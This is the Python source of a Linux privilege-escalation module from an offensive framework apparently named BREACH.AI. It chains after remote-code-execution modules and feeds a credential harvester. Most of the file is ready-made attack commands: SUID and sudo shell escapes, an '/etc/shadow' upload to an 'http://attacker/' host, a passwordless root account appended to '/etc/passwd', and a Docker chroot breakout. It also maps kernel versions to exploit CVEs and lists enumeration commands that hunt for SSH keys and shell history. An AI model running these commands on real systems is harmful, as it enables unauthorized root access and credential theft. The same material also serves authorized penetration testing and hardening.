"""
BREACH.AI v2 - Linux Escalator

Linux privilege escalation module exploiting SUID binaries, sudo misconfigurations,
writable sensitive files, cron jobs, kernel exploits, and container breakouts.
"""

import asyncio
import re
from typing import Optional

from breach.modules.base import (
    EscalationModule,
    ModuleConfig,
    ModuleInfo,
    register_module,
)
from breach.core.killchain import (
    BreachPhase,
    ModuleResult,
    EvidenceType,
    AccessLevel,
    Severity,
)


# SUID binaries that can be exploited for privilege escalation
EXPLOITABLE_SUID = {
    # GTFOBins - binaries that can be exploited when SUID
    "bash": {"method": "bash -p", "shell": True},
    "sh": {"method": "sh -p", "shell": True},
    "csh": {"method": "csh -b", "shell": True},
    "zsh": {"method": "zsh", "shell": True},
    "dash": {"method": "dash -p", "shell": True},
    "ksh": {"method": "ksh -p", "shell": True},
    "python": {"method": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'", "shell": True},
    "python2": {"method": "python2 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'", "shell": True},
    "python3": {"method": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'", "shell": True},
    "perl": {"method": "perl -e 'exec \"/bin/sh\";'", "shell": True},
    "ruby": {"method": "ruby -e 'exec \"/bin/sh\"'", "shell": True},
    "lua": {"method": "lua -e 'os.execute(\"/bin/sh\")'", "shell": True},
    "php": {"method": "php -r \"pcntl_exec('/bin/sh', ['-p']);\"", "shell": True},
    "node": {"method": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'", "shell": True},
    "vim": {"method": "vim -c ':!/bin/sh'", "shell": True},
    "vi": {"method": "vi -c ':!/bin/sh'", "shell": True},
    "nano": {"method": "nano then Ctrl+R Ctrl+X then /bin/sh", "shell": True},
    "less": {"method": "less /etc/passwd then !/bin/sh", "shell": True},
    "more": {"method": "more /etc/passwd then !/bin/sh", "shell": True},
    "man": {"method": "man man then !/bin/sh", "shell": True},
    "awk": {"method": "awk 'BEGIN {system(\"/bin/sh\")}'", "shell": True},
    "find": {"method": "find . -exec /bin/sh -p \\; -quit", "shell": True},
    "nmap": {"method": "nmap --interactive then !sh", "shell": True},
    "tar": {"method": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh", "shell": True},
    "zip": {"method": "zip /tmp/x.zip /etc/passwd -T -TT '/bin/sh #'", "shell": True},
    "wget": {"method": "wget --post-file=/etc/shadow http://attacker/", "file_read": True},
    "curl": {"method": "curl file:///etc/shadow", "file_read": True},
    "cp": {"method": "cp /etc/shadow /tmp/", "file_copy": True},
    "mv": {"method": "mv /etc/shadow /tmp/", "file_move": True},
    "cat": {"method": "cat /etc/shadow", "file_read": True},
    "head": {"method": "head /etc/shadow", "file_read": True},
    "tail": {"method": "tail /etc/shadow", "file_read": True},
    "dd": {"method": "dd if=/etc/shadow", "file_read": True},
    "tee": {"method": "echo 'root2::0:0::/root:/bin/bash' | tee -a /etc/passwd", "file_write": True},
    "env": {"method": "env /bin/sh -p", "shell": True},
    "time": {"method": "/usr/bin/time /bin/sh -p", "shell": True},
    "strace": {"method": "strace -o /dev/null /bin/sh -p", "shell": True},
    "ltrace": {"method": "ltrace -L /bin/sh -p", "shell": True},
    "taskset": {"method": "taskset 1 /bin/sh -p", "shell": True},
    "nice": {"method": "nice /bin/sh -p", "shell": True},
    "ionice": {"method": "ionice /bin/sh -p", "shell": True},
    "setarch": {"method": "setarch $(arch) /bin/sh -p", "shell": True},
    "start-stop-daemon": {"method": "start-stop-daemon -n x -S -x /bin/sh -- -p", "shell": True},
    "run-parts": {"method": "run-parts --new-session --regex '^sh$' /bin", "shell": True},
    "docker": {"method": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh", "shell": True},
    "mount": {"method": "mount -o bind /bin/sh /bin/mount; /bin/mount", "shell": True},
    "systemctl": {"method": "systemctl then !sh", "shell": True},
    "service": {"method": "service ../../bin/sh", "shell": True},
}

# Sudo misconfigurations that allow privilege escalation
SUDO_EXPLOITS = {
    "ALL": {"description": "User can run any command as root", "severity": "critical"},
    "NOPASSWD": {"description": "No password required for sudo", "severity": "high"},
    "/bin/bash": {"description": "Direct bash access", "command": "sudo /bin/bash"},
    "/bin/sh": {"description": "Direct shell access", "command": "sudo /bin/sh"},
    "/usr/bin/vim": {"description": "Vim shell escape", "command": "sudo vim -c ':!/bin/sh'"},
    "/usr/bin/vi": {"description": "Vi shell escape", "command": "sudo vi -c ':!/bin/sh'"},
    "/usr/bin/nano": {"description": "Nano shell escape", "command": "sudo nano; Ctrl+R; Ctrl+X; /bin/sh"},
    "/usr/bin/less": {"description": "Less shell escape", "command": "sudo less /etc/passwd; !/bin/sh"},
    "/usr/bin/more": {"description": "More shell escape", "command": "sudo more /etc/passwd; !/bin/sh"},
    "/usr/bin/man": {"description": "Man shell escape", "command": "sudo man man; !/bin/sh"},
    "/usr/bin/awk": {"description": "Awk command execution", "command": "sudo awk 'BEGIN {system(\"/bin/sh\")}'"},
    "/usr/bin/find": {"description": "Find command execution", "command": "sudo find . -exec /bin/sh \\; -quit"},
    "/usr/bin/perl": {"description": "Perl command execution", "command": "sudo perl -e 'exec \"/bin/sh\";'"},
    "/usr/bin/python": {"description": "Python command execution", "command": "sudo python -c 'import os; os.system(\"/bin/sh\")'"},
    "/usr/bin/python3": {"description": "Python3 command execution", "command": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'"},
    "/usr/bin/ruby": {"description": "Ruby command execution", "command": "sudo ruby -e 'exec \"/bin/sh\"'"},
    "/usr/bin/env": {"description": "Env path manipulation", "command": "sudo env /bin/sh"},
    "/usr/bin/ftp": {"description": "FTP shell escape", "command": "sudo ftp; !/bin/sh"},
    "/usr/bin/nmap": {"description": "Nmap interactive mode", "command": "sudo nmap --interactive; !sh"},
    "/usr/bin/docker": {"description": "Docker privileged container", "command": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"},
    "/usr/bin/zip": {"description": "Zip command execution", "command": "sudo zip /tmp/x.zip /etc/passwd -T -TT '/bin/sh #'"},
    "/usr/bin/tar": {"description": "Tar command execution", "command": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"},
    "/usr/bin/rsync": {"description": "Rsync command execution", "command": "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"},
    "/usr/bin/git": {"description": "Git shell escape", "command": "sudo git -p help config; !/bin/sh"},
    "/usr/bin/scp": {"description": "SCP command execution", "command": "TF=$(mktemp); echo 'sh 0<&2 1>&2' > $TF; chmod +x $TF; sudo scp -S $TF x y:"},
    "/usr/bin/ssh": {"description": "SSH ProxyCommand", "command": "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"},
    "/usr/bin/mysql": {"description": "MySQL shell escape", "command": "sudo mysql -e '\\! /bin/sh'"},
    "/usr/bin/psql": {"description": "PostgreSQL shell escape", "command": "sudo psql -c '\\! /bin/sh'"},
    "LD_PRELOAD": {"description": "LD_PRELOAD environment preserved", "severity": "critical"},
    "env_keep": {"description": "Environment variables preserved in sudo", "severity": "high"},
}

# Kernel exploits by version
KERNEL_EXPLOITS = {
    "2.6": [
        {"name": "Dirty COW", "cve": "CVE-2016-5195", "versions": "2.6.22 - 4.8.3"},
        {"name": "Full Nelson", "cve": "CVE-2010-4258", "versions": "2.6.x"},
    ],
    "3.": [
        {"name": "Dirty COW", "cve": "CVE-2016-5195", "versions": "3.x - 4.8.3"},
        {"name": "OverlayFS", "cve": "CVE-2015-1328", "versions": "3.13 - 3.19"},
    ],
    "4.": [
        {"name": "Dirty COW", "cve": "CVE-2016-5195", "versions": "4.0 - 4.8.3"},
        {"name": "Dirty Pipe", "cve": "CVE-2022-0847", "versions": "5.8 - 5.16.11"},
    ],
    "5.": [
        {"name": "Dirty Pipe", "cve": "CVE-2022-0847", "versions": "5.8 - 5.16.11"},
        {"name": "Netfilter", "cve": "CVE-2022-25636", "versions": "5.4 - 5.6.10"},
        {"name": "io_uring", "cve": "CVE-2022-29582", "versions": "5.10"},
    ],
}

# Commands to enumerate Linux system
ENUM_COMMANDS = {
    "suid": "find / -perm -4000 -type f 2>/dev/null",
    "sgid": "find / -perm -2000 -type f 2>/dev/null",
    "sudo_l": "sudo -l 2>/dev/null",
    "writable_passwd": "ls -la /etc/passwd 2>/dev/null",
    "writable_shadow": "ls -la /etc/shadow 2>/dev/null",
    "writable_sudoers": "ls -la /etc/sudoers 2>/dev/null",
    "cron_system": "cat /etc/crontab 2>/dev/null",
    "cron_user": "crontab -l 2>/dev/null",
    "cron_d": "ls -la /etc/cron.d/ 2>/dev/null",
    "kernel_version": "uname -r",
    "os_info": "cat /etc/os-release 2>/dev/null",
    "capabilities": "getcap -r / 2>/dev/null",
    "docker_group": "groups | grep docker",
    "docker_socket": "ls -la /var/run/docker.sock 2>/dev/null",
    "env_vars": "env 2>/dev/null",
    "processes": "ps aux 2>/dev/null",
    "network": "netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null",
    "passwd_hashes": "cat /etc/passwd 2>/dev/null",
    "ssh_keys": "find /home -name 'id_rsa' -o -name '*.pem' 2>/dev/null",
    "history": "cat ~/.bash_history 2>/dev/null",
    "writable_scripts": "find / -writable -type f -name '*.sh' 2>/dev/null",
}


@register_module
class LinuxEscalator(EscalationModule):
    """
    Linux Escalator - Privilege escalation on Linux systems.

    Techniques:
    - SUID/SGID binary exploitation
    - Sudo misconfiguration abuse
    - Writable /etc/passwd or /etc/shadow
    - Cron job script hijacking
    - Kernel exploit identification
    - Docker group membership
    - Capabilities abuse
    - LD_PRELOAD exploitation
    """

    info = ModuleInfo(
        name="linux_escalator",
        phase=BreachPhase.ESCALATION,
        description="Linux privilege escalation via SUID, sudo, cron, kernel exploits",
        author="BREACH.AI",
        techniques=["T1548.001", "T1548.003", "T1053.003"],  # SUID/SGID, Sudo, Cron
        platforms=["linux"],
        requires_access=True,
        required_access_level=AccessLevel.USER,
        provides_access=True,
        max_access_level=AccessLevel.ROOT,
    )

    async def check(self, config: ModuleConfig) -> bool:
        """Check if we have shell access to a Linux system."""
        # Check for RCE capability from previous modules
        has_rce = config.chain_data.get("rce_capability", False)
        has_shell = config.chain_data.get("shell_access", False)
        is_linux = config.chain_data.get("os_type", "").lower() == "linux"

        return has_rce or has_shell or is_linux

    async def run(self, config: ModuleConfig) -> ModuleResult:
        """Execute Linux privilege escalation techniques."""
        self._start_execution()

        escalation_paths = []
        target = config.target

        # Enumerate system
        enum_data = await self._enumerate_system(config)

        # Check SUID binaries
        suid_paths = await self._check_suid_binaries(enum_data, config)
        escalation_paths.extend(suid_paths)

        # Check sudo configuration
        sudo_paths = await self._check_sudo_config(enum_data, config)
        escalation_paths.extend(sudo_paths)

        # Check writable sensitive files
        file_paths = await self._check_writable_files(enum_data, config)
        escalation_paths.extend(file_paths)

        # Check cron jobs
        cron_paths = await self._check_cron_jobs(enum_data, config)
        escalation_paths.extend(cron_paths)

        # Check kernel version for exploits
        kernel_paths = await self._check_kernel_exploits(enum_data, config)
        escalation_paths.extend(kernel_paths)

        # Check Docker access
        docker_paths = await self._check_docker_access(enum_data, config)
        escalation_paths.extend(docker_paths)

        # Check capabilities
        cap_paths = await self._check_capabilities(enum_data, config)
        escalation_paths.extend(cap_paths)

        # Collect evidence
        for path in escalation_paths:
            severity = Severity.CRITICAL if path.get("root_shell") else Severity.HIGH

            self._add_evidence(
                evidence_type=EvidenceType.COMMAND_OUTPUT,
                description=f"Privilege Escalation: {path['type']}",
                content={
                    "type": path["type"],
                    "target": path.get("target", ""),
                    "method": path.get("method", ""),
                    "command": path.get("command", ""),
                    "root_shell": path.get("root_shell", False),
                },
                proves=f"Privilege escalation via {path['type']}",
                severity=severity,
            )

        # Determine access level
        access_gained = None
        if any(p.get("root_shell") for p in escalation_paths):
            access_gained = AccessLevel.ROOT
        elif escalation_paths:
            access_gained = AccessLevel.USER  # Some escalation path found

        return self._create_result(
            success=len(escalation_paths) > 0,
            action="linux_privilege_escalation",
            details=f"Found {len(escalation_paths)} privilege escalation paths",
            access_gained=access_gained,
            data_extracted={"escalation_paths": escalation_paths} if escalation_paths else None,
            enables_modules=["credential_harvester", "network_spider"] if access_gained else [],
        )

    async def _enumerate_system(self, config: ModuleConfig) -> dict:
        """Enumerate system for privilege escalation vectors."""
        # In real implementation, this would execute commands via RCE
        # Here we check chain_data for previously gathered data

        enum_data = {
            "suid_binaries": config.chain_data.get("suid_binaries", []),
            "sudo_output": config.chain_data.get("sudo_output", ""),
            "kernel_version": config.chain_data.get("kernel_version", ""),
            "passwd_writable": config.chain_data.get("passwd_writable", False),
            "shadow_writable": config.chain_data.get("shadow_writable", False),
            "cron_jobs": config.chain_data.get("cron_jobs", []),
            "docker_access": config.chain_data.get("docker_access", False),
            "capabilities": config.chain_data.get("capabilities", []),
            "writable_scripts": config.chain_data.get("writable_scripts", []),
        }

        return enum_data

    async def _check_suid_binaries(self, enum_data: dict, config: ModuleConfig) -> list:
        """Check for exploitable SUID binaries."""
        paths = []
        suid_binaries = enum_data.get("suid_binaries", [])

        for binary_path in suid_binaries:
            # Extract binary name from path
            binary_name = binary_path.split("/")[-1]

            if binary_name in EXPLOITABLE_SUID:
                exploit_info = EXPLOITABLE_SUID[binary_name]
                paths.append({
                    "type": "suid_binary",
                    "target": binary_path,
                    "binary": binary_name,
                    "method": exploit_info["method"],
                    "root_shell": exploit_info.get("shell", False),
                    "file_access": exploit_info.get("file_read", False) or exploit_info.get("file_write", False),
                })

        return paths

    async def _check_sudo_config(self, enum_data: dict, config: ModuleConfig) -> list:
        """Check sudo configuration for privilege escalation."""
        paths = []
        sudo_output = enum_data.get("sudo_output", "")

        if not sudo_output:
            return paths

        # Check for ALL privileges
        if "(ALL)" in sudo_output and "ALL" in sudo_output:
            paths.append({
                "type": "sudo_all",
                "method": "User can run any command as root",
                "command": "sudo /bin/bash",
                "root_shell": True,
            })
            return paths  # No need to check further

        # Check for NOPASSWD
        nopasswd = "NOPASSWD" in sudo_output

        # Check for specific exploitable commands
        for cmd, exploit_info in SUDO_EXPLOITS.items():
            if cmd in sudo_output:
                paths.append({
                    "type": "sudo_command",
                    "target": cmd,
                    "method": exploit_info.get("description", ""),
                    "command": exploit_info.get("command", ""),
                    "nopasswd": nopasswd,
                    "root_shell": True,
                })

        # Check for LD_PRELOAD
        if "env_keep" in sudo_output.lower() or "ld_preload" in sudo_output.lower():
            paths.append({
                "type": "sudo_ld_preload",
                "method": "LD_PRELOAD environment variable preserved",
                "command": "Compile malicious shared object and use LD_PRELOAD",
                "root_shell": True,
            })

        return paths

    async def _check_writable_files(self, enum_data: dict, config: ModuleConfig) -> list:
        """Check for writable sensitive files."""
        paths = []

        if enum_data.get("passwd_writable"):
            paths.append({
                "type": "writable_passwd",
                "target": "/etc/passwd",
                "method": "Add root user with known password",
                "command": "echo 'root2::0:0::/root:/bin/bash' >> /etc/passwd",
                "root_shell": True,
            })

        if enum_data.get("shadow_writable"):
            paths.append({
                "type": "writable_shadow",
                "target": "/etc/shadow",
                "method": "Modify root password hash",
                "command": "Replace root hash in /etc/shadow",
                "root_shell": True,
            })

        return paths

    async def _check_cron_jobs(self, enum_data: dict, config: ModuleConfig) -> list:
        """Check for exploitable cron jobs."""
        paths = []
        cron_jobs = enum_data.get("cron_jobs", [])
        writable_scripts = enum_data.get("writable_scripts", [])

        # Check if any cron job scripts are writable
        for script in writable_scripts:
            for job in cron_jobs:
                if script in job:
                    paths.append({
                        "type": "cron_hijack",
                        "target": script,
                        "method": "Hijack writable cron script",
                        "command": f"Add reverse shell to {script}",
                        "root_shell": True,
                    })

        # Check for wildcard injection in cron
        for job in cron_jobs:
            if "*" in job and ("tar" in job or "rsync" in job):
                paths.append({
                    "type": "cron_wildcard",
                    "target": job,
                    "method": "Wildcard injection in cron command",
                    "command": "Create malicious files with command injection names",
                    "root_shell": True,
                })

        return paths

    async def _check_kernel_exploits(self, enum_data: dict, config: ModuleConfig) -> list:
        """Check kernel version against known exploits."""
        paths = []
        kernel_version = enum_data.get("kernel_version", "")

        if not kernel_version:
            return paths

        # Check against known exploits
        for version_prefix, exploits in KERNEL_EXPLOITS.items():
            if kernel_version.startswith(version_prefix):
                for exploit in exploits:
                    # Check if version is in vulnerable range
                    paths.append({
                        "type": "kernel_exploit",
                        "target": kernel_version,
                        "exploit": exploit["name"],
                        "cve": exploit["cve"],
                        "method": f"Kernel exploit: {exploit['name']} ({exploit['cve']})",
                        "vulnerable_versions": exploit["versions"],
                        "root_shell": True,
                    })

        return paths

    async def _check_docker_access(self, enum_data: dict, config: ModuleConfig) -> list:
        """Check for Docker group membership or socket access."""
        paths = []

        if enum_data.get("docker_access"):
            paths.append({
                "type": "docker_escape",
                "method": "Docker socket access allows container escape",
                "command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
                "root_shell": True,
            })

        return paths

    async def _check_capabilities(self, enum_data: dict, config: ModuleConfig) -> list:
        """Check for exploitable Linux capabilities."""
        paths = []
        capabilities = enum_data.get("capabilities", [])

        # Dangerous capabilities
        dangerous_caps = {
            "cap_setuid": {"method": "setuid(0) to become root", "shell": True},
            "cap_setgid": {"method": "setgid(0) to join root group", "shell": True},
            "cap_dac_override": {"method": "Read/write any file", "file_access": True},
            "cap_dac_read_search": {"method": "Read any file", "file_access": True},
            "cap_sys_admin": {"method": "Mount filesystems, load modules", "shell": True},
            "cap_sys_ptrace": {"method": "Ptrace any process for code injection", "shell": True},
            "cap_net_admin": {"method": "Network configuration manipulation", "shell": False},
            "cap_net_raw": {"method": "Raw socket access for sniffing", "shell": False},
        }

        for cap_entry in capabilities:
            for cap_name, exploit_info in dangerous_caps.items():
                if cap_name in cap_entry.lower():
                    binary = cap_entry.split()[0] if cap_entry else "unknown"
                    paths.append({
                        "type": "capability",
                        "target": binary,
                        "capability": cap_name,
                        "method": exploit_info["method"],
                        "root_shell": exploit_info.get("shell", False),
                    })

        return paths
